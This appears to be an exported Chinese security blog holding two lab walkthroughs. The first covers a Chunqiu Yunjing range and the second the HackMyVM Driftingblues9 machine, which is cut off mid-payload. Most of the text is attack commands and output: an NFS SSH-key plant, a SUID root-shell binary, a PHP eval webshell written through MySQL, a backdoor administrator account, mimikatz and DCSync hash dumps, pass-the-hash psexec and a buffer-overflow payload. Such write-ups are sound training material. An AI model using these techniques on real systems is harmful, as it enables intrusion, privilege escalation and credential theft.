Version: 2.0.0\n\n[2025-04-27 16:07:15] [INFO] 暴力破解线程数: 1\n[2025-04-27 16:07:15] [INFO] 开始信息扫描\n[2025-04-27 16:07:15] [INFO] CIDR 范围: 172.22.13.0-172.22.13.255\n[2025-04-27 16:07:15] [INFO] 生成 IP 范围: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)\n[2025-04-27 16:07:16] [INFO] 解析 CIDR 172.22.13.14/24 -> IP 范围 172.22.13.0-172.22.13.255\n[2025-04-27 16:07:16] [INFO] 最终有效主机数量: 256\n[2025-04-27 16:07:16] [INFO] 开始主机扫描\n[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.6     存活 (ICMP)\n[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.14    存活 (ICMP)\n[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.28    存活 (ICMP)\n[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.57    存活 (ICMP)\n[2025-04-27 16:07:19] [INFO] 存活主机数量: 4\n[2025-04-27 16:07:19] [INFO] 有效端口数量: 1\n[2025-04-27 16:07:19] [SUCCESS] 端口开放 172.22.13.57:2049\n~~~\n\n172.22.13.57 开了 2049 的端口\n\n~~~\n#在靶机上操作\nroot@ubuntu:~# showmount -e 172.22.13.57\nExport list for 172.22.13.57:\n/home/joyce *\nroot@ubuntu:~# cd /tmp\nroot@ubuntu:/tmp# mkdir test\nroot@ubuntu:/tmp# mount -t nfs 172.22.13.57:/ ./test -o nolock\n~~~\n\n然后 joyce 的家目录就被成功挂载了，写一个公钥进去\n\n~~~\nroot@ubuntu:/tmp/test/home/joyce# mkdir .ssh\nroot@ubuntu:/tmp/test/home/joyce# cd .ssh\nroot@ubuntu:/tmp/test/home/joyce/.ssh# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcatU49PfwyMAfrfJcaaIFCNOJNWOdDonEg3ahNxG8H root@kali'> authorized_keys\n~~~\n\n然后 ssh 连接\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/123]\n└─# proxy -f proxychains4.conf ssh joyce@172.22.13.57\n[proxychains] config file found: proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.13.57:22  ...  OK\nThe authenticity of host '172.22.13.57 (172.22.13.57)' can't be established.\nED25519 key fingerprint is SHA256: Y8qbRlvlJKReDyk1mEsy/A7aQosNyeucM/GZs7aI8SA.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '172.22.13.57' (ED25519) to the list of known hosts.\nLast login: Thu Aug 11 18:16:01 2022\n\nWelcome to Alibaba Cloud Elastic Compute Service !\n\n[joyce@centos ~]$ ls\n[joyce@centos ~]$ ls -al\ntotal 28\ndrwx------  3 joyce joyce 4096 Apr 27 16:11 .\ndrwxr-xr-x. 4 root  root  4096 Aug 10  2022 ..\n-rw-------  1 joyce joyce    5 Aug 11  2022 .bash_history\n-rw-r--r--  1 joyce joyce   18 Nov 25  2021 .bash_logout\n-rw-r--r--  1 joyce joyce  193 Nov 25  2021 .bash_profile\n-rw-r--r--  1 joyce joyce  231 Nov 25  2021 .bashrc\ndrwxr-xr-x  2 root  root  4096 Apr 27 16:12 .ssh\n[joyce@centos ~]$\n~~~\n\n尝试提权，查找 suid 权限\n\n~~~\n[joyce@centos ~]$ find / -perm -u = s 2 >/dev/null\n/usr/libexec/dbus-1/dbus-daemon-launch-helper\n/usr/sbin/unix_chkpwd\n/usr/sbin/pam_timestamp_check\n/usr/sbin/usernetctl\n/usr/sbin/mount.nfs\n/usr/bin/sudo\n/usr/bin/chage\n/usr/bin/at\n/usr/bin/mount\n/usr/bin/crontab\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/ftp\n/usr/bin/umount\n/usr/lib/polkit-1/polkit-agent-helper-1\n~~~\n\nftp 提权可以读文件，也可以通过 nfs 上传一个恶意文件拿到 shell\n\n~~~\nroot@ubuntu:/tmp# echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > root.c\nroot@ubuntu:/tmp# gcc root.c -o root\nroot.c: In function ‘main’:\nroot.c: 1:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]\n    1 | int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }\n      |              ^~~~~~\nroot.c: 1:25: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]\n    1 | int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }\n      |                         ^~~~~~\nroot.c: 1:36: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]\n    1 | int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }\n      |\nroot@ubuntu:/tmp# chmod +s ./root\nroot@ubuntu:/tmp# mv root ./test/home/joyce/\n~~~\n\n~~~\n[joyce@centos ~]$ ls\nroot\n[joyce@centos ~]$ ./root\n[root@centos ~]# id\nuid = 0(root) gid = 0(root) groups = 0(root),994(joyce)\n~~~\n\nflag02 在根目录下\n\n# FLAG03\n\n 172.22.13.28 是一个 OA 系统，用 fscan 扫一下全端口，可以扫到 mysql 有弱口令\n\n~~~\nroot: 123456\n~~~\n\nnavicat 连接\n\n~~~\nmysql > show variables like \"secure_file_priv\";\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n1 row in set (0.05 sec)\nmysql > show variables like \"%general%\";\n+------------------+--------------------------------------------------------------+\n| Variable_name    | Value                                                        |\n+------------------+--------------------------------------------------------------+\n| general_log      | OFF                                                          |\n| general_log_file | C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\WIN-HAUWOLAO.log |\n+------------------+--------------------------------------------------------------+\n2 rows in set (0.06 sec)\n~~~\n\n尝试写马\n\n~~~\nmysql > select \"<?php eval($_POST[1]);?>\" into outfile \"C:/phpstudy_pro/WWW/1.php\";\nQuery OK, 1 row affected (0.03 sec)\n~~~\n\n然后蚁剑连接，flag03 在 C:/Users/Administrator/flag/下\n\n# FLAG04\n\n创建一个用户，添加进用户组里\n\n~~~\nC:\\Users\\Administrator\\flag > net user lv Asd123123 /add\n命令成功完成。\n \nC:\\Users\\Administrator\\flag > net localgroup administrators lv /add\n命令成功完成。\n~~~\n\n然后远程桌面连接，上传一个 mimikatz 抓取哈希\n\n~~~\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz # privilege:: debug\nPrivilege '20' OK\n\nmimikatz # log\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz # sekurlsa:: logonpasswords\n\nAuthentication Id : 0 ; 11159151 (00000000:00aa466f)\nSession           : RemoteInteractive from 2\nUser Name         : lv\nDomain            : WIN-HAUWOLAO\nLogon Server      : WIN-HAUWOLAO\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-21-2057596273-973658165-3030246172-1000\n        msv :\n         [00000003] Primary\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * NTLM     : 85edf6aacad2ac8e2a7a44741eb0b236\n         * SHA1     : aab02ea07aee541e9f60a1f6d5a54a2045965743\n        tspkg :\n        wdigest :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        kerberos :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 11136230 (00000000:00a9ece6)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-90-0-2\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 11136190 (00000000:00a9ecbe)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-90-0-2\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 91296 (00000000:000164a0)\nSession           : Service from 0\nUser Name         : chenglei\nDomain            : XIAORANG\nLogon Server      : WIN-DC\nLogon Time        : 2025/4/27 15:43:55\nSID               : S-1-5-21-3269458654-3569381900-10559451-1105\n        msv :\n         [00000003] Primary\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * NTLM     : 0c00801c30594a1b8eaa889d237c5382\n         * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7\n         * DPAPI    : 89b179dc738db098372c365602b7b0f4\n        tspkg :\n        wdigest :\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : chenglei\n         * Domain   : XIAORANG.LAB\n         * Password : Xt61f3LBhg1\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 53263 (00000000:0000d00f)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d\n         * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : `k+hcEDFvtzoObj=>DvzxiNqwyEn;Eu-\\zFVAh>.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB'LLG6wSx6TR%m;` Nfr;; Hf8O'Szfl0Z = w+^,> 0jR\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : WIN-HAUWOLAO$\nDomain            : XIAORANG\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-20\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : win-hauwolao$\n         * Domain   : XIAORANG.LAB\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 24185 (00000000:00005e79)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:52\nSID               :\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 11159180 (00000000:00aa468c)\nSession           : RemoteInteractive from 2\nUser Name         : lv\nDomain            : WIN-HAUWOLAO\nLogon Server      : WIN-HAUWOLAO\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-21-2057596273-973658165-3030246172-1000\n        msv :\n         [00000003] Primary\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * NTLM     : 85edf6aacad2ac8e2a7a44741eb0b236\n         * SHA1     : aab02ea07aee541e9f60a1f6d5a54a2045965743\n        tspkg :\n        wdigest :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        kerberos :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 91297 (00000000:000164a1)\nSession           : Service from 0\nUser Name         : chenglei\nDomain            : XIAORANG\nLogon Server      : WIN-DC\nLogon Time        : 2025/4/27 15:43:55\nSID               : S-1-5-21-3269458654-3569381900-10559451-1105\n        msv :\n         [00000003] Primary\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * NTLM     : 0c00801c30594a1b8eaa889d237c5382\n         * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7\n         * DPAPI    : 89b179dc738db098372c365602b7b0f4\n        tspkg :\n        wdigest :\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : chenglei\n         * Domain   : XIAORANG.LAB\n         * Password : Xt61f3LBhg1\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 53235 (00000000:0000cff3)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : WIN-HAUWOLAO$\nDomain            : XIAORANG\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:52\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : win-hauwolao$\n         * Domain   : XIAORANG.LAB\n         * Password : (null)\n        ssp :\n        credman :\n\nmimikatz # \\\n~~~\n\n拿到了一个域内用户 `chenglei`，查看 chenglei 的域内权限\n\n~~~\nC:\\Users\\Administrator\\flag > net user chenglei /domain\n这项请求将在域 xiaorang.lab 的域控制器处理。\n用户名                 chenglei\n全名                   \n注释                   \n用户的注释             \n国家/地区代码          000 (系统默认值)\n帐户启用               Yes\n帐户到期               从不\n上次设置密码           2023/7/11 14:57:52\n密码到期               从不\n密码可更改             2023/7/12 14:57:52\n需要密码               Yes\n用户可以更改密码       Yes\n允许的工作站           All\n登录脚本               \n用户配置文件           \n主目录                 \n上次登录               2025/4/27 16:57:57\n可允许的登录小时数     All\n本地组成员             \n全局组成员             *ACL Admin            * Domain Users         \n命令成功完成。\n~~~\n\n属于 ACL Admin 组，这个组有 WriteDACL 的权限，给 chenglei 去添加 DCSync 权限\n\n```\n┌──(root㉿kali)-[~/Desktop/tmp/123]\n└─# bloodyAD --host 172.22.13.6 -d \"XIAORANG.LAB\" -u chenglei -p Xt61f3LBhg1 add dcsync \"chenglei\"\n[+] chenglei is now able to DCSync\n```\n\n然后用 chenglei 远程登录 mimikatz 抓取域内哈希\n\n~~~\nmimikatz # lsadump:: dcsync /domian: xiaorang.lab /all /csv\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'WIN-DC.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n1104    zhangwen        fa7d776fdfc82d3f43c9d8b7f5312d77        512\n502     krbtgt  cb976ec1a1bf8a14a15142c6fecc540e        514\n1106    zhangtao        e786c4a4987ced162c496d0519496729        512\n1000    WIN-DC$ 5a5c8ad1abcec444c534563d7db5c332        532480\n500     Administrator   6341235defdaed66fb7b682665752c9a        512\n1105    chenglei        0c00801c30594a1b8eaa889d237c5382        512\n1103    WIN-HAUWOLAO$   00f24a2e0e0076b23f55b10e54d4cc25        4096\n~~~\n\n然后横向就行了\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/123]\n└─# impacket-psexec  -hashes : 6341235defdaed66fb7b682665752c9a Administrator@172.22.13.6\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 172.22.13.6.....\n[*] Found writable share ADMIN$\n[*] Uploading file hUqShSba.exe\n[*] Opening SVCManager on 172.22.13.6.....\n[*] Creating service PuTe on 172.22.13.6.....\n[*] Starting service PuTe.....\n[!] Press help for extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [� 汾 10.0.20348.1787]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\n(c) Microsoft Corporation����������Ȩ����\n\n\nC:\\Windows\\system32 >\n~~~\n\nflag4 在 C:\\Users\\Administrator\\flag 下\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"HackmyVM-Driftingblues9","url":"/2025/04/24/HackmyVM-Driftingblues9/","content":"\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:70:2e:5f       PCS Systemtechnik GmbH\n192.168.31.159  08:00:27:b3:1b:96       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.159就是靶机\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.159 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 02:36 EDT\nNmap scan report for 192.168.31.159\nHost is up (0.0013s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT      STATE SERVICE\n80/tcp    open  http\n111/tcp   open  rpcbind\n41157/tcp open  unknown\nMAC Address: 08:00:27:B3:1B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.08 seconds\n~~~\n\n# 80端口\n\n扫描目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.159/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .php,.txt,.jpg\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.159/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,jpg\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 317] [--> http://192.168.31.159/images/]\n/.php                 (Status: 403) [Size: 279]\n/index.php            (Status: 200) [Size: 5656]\n/docs                 (Status: 301) [Size: 315] [--> http://192.168.31.159/docs/]\n/page                 (Status: 301) [Size: 315] [--> http://192.168.31.159/page/]\n/header.php           (Status: 200) [Size: 13]\n/admin                (Status: 301) [Size: 316] [--> http://192.168.31.159/admin/]\n/footer.php           (Status: 500) [Size: 614]\n/license              (Status: 301) [Size: 318] [--> http://192.168.31.159/license/]\n/README.txt           (Status: 200) [Size: 975]\n/js                   (Status: 301) [Size: 313] [--> http://192.168.31.159/js/]\n/include              (Status: 301) [Size: 318] [--> http://192.168.31.159/include/]\n/backup               (Status: 301) [Size: 317] [--> http://192.168.31.159/backup/]\n/styles               (Status: 301) [Size: 317] [--> http://192.168.31.159/styles/]\n/INSTALL.txt          (Status: 200) [Size: 1201]\n/.php                 (Status: 403) [Size: 279]\n/wysiwyg              (Status: 301) [Size: 318] [--> http://192.168.31.159/wysiwyg/]\n/server-status        (Status: 403) [Size: 279]\n/mails                (Status: 301) [Size: 316] [--> http://192.168.31.159/mails/]\n~~~\n\n从/README.txt 得知是ApPHP的框架，mails里有账号和密码，其他的都没什么用\n\n~~~\nHello _USER_NAME_!<br> <br>\n\nYou or someone else asked for your login info on our site, _WEB_SITE_\n\nYour Login Info:\n------------------------<br/>\nUsername: _USER_NAME_\nPassword: _USER_PASSWORD_\n\n------------------<br/>\nBest regards,\n_WEB_SITE_\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# searchsploit apphp\n-------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                        |  Path\n-------------------------------------------------------------------------------------- ---------------------------------\nApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                      | php/webapps/33030.txt\nApPHP MicroBlog 1.0.1 - Remote Command Execution                                      | php/webapps/33070.py\nApPHP MicroBlog 1.0.2 - Cross-Site Request Forgery (Add New Author)                   | php/webapps/40506.html\nApPHP MicroBlog 1.0.2 - Persistent Cross-Site Scripting                               | php/webapps/40505.txt\nApPHP MicroCMS 3.9.5 - Cross-Site Request Forgery (Add Admin)                         | php/webapps/40517.html\nApPHP MicroCMS 3.9.5 - Persistent Cross-Site Scripting                                | php/webapps/40516.txt\n-------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n~~~\n\nphp/webapps/33070.py跑这个脚本就行，然后弹出来一个shell\n\n# 提权\n\n在/var/www/html/include/base.inc.php里有用户名和密码\n\n~~~\nwww-data@debian:/var/www/html/include$ cat base.inc.php\n<?php\n                        // DATABASE CONNECTION INFORMATION\n                        define('DATABASE_HOST', 'localhost');           // Database host\n                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used\n                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database\n                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database\n                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key\n                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the database\n                        ?>\n~~~\n\nsu clapton\n\n# 提权root\n\nhome目录下有input一个程序和一个note\n\n~~~\nclapton@debian:~$ cat note.txt\nbuffer overflow is the way. ( ͡° ͜ʖ ͡°)\n\nif you're new on 32bit bof then check these:\n\nhttps://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html\nhttps://samsclass.info/127/proj/lbuf1.htm\n~~~\n\ninput的伪c代码\n\n~~~\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char dest[159]; // [esp+11h] [ebp-9Fh] BYREF\n\n  if ( argc <= 1 )\n  {\n    printf(\"Syntax: %s <input string>\\n\", *argv);\n    exit(0);\n  }\n  strcpy(dest, argv[1]);\n  return 0;\n}\n~~~\n\n二进制我属实不会，看大佬wp了\n\npayload：\n\n~~~\nfor i in {1..10000}; do (./input $(python -c 'print(\"A\" * 171 + \"\\xa0\\xe7\\x84\\xbf\" + \"\\x90\" * 1000 + 